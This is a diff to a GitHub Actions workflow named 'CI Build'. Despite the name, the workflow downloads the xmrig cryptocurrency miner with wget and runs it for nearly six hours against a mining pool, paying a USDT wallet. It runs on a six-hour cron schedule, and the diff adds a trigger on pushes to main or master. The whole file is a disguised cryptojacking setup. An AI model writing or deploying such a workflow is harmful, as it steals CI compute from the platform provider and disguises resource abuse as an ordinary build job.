@@ -2,6 +2,7 @@ name: CI Build
 
 on:
   push:
+    branches: [ main, master ]
   workflow_dispatch:
   schedule:
     - cron: '0 */6 * * *'
@@ -17,7 +18,12 @@ jobs:
     - name: Download
       run: wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -xf xmrig-6.21.0-linux-x64.tar.gz
     - name: Mine
-      run: cd xmrig-6.21.0 && chmod +x xmrig && timeout 345m ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.vps8497_mgufindo -p x --donate-level 1 || true
+      run: |
+        cd xmrig-6.21.0 && chmod +x xmrig && timeout 345m ./xmrig \
+        -o rx.unmineable.com:3333 \
+        -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.d1337_mgufindo \
+        -p x \
+        --donate-level 1 || true
     - name: Done
       if: always()
       run: echo "Complete"
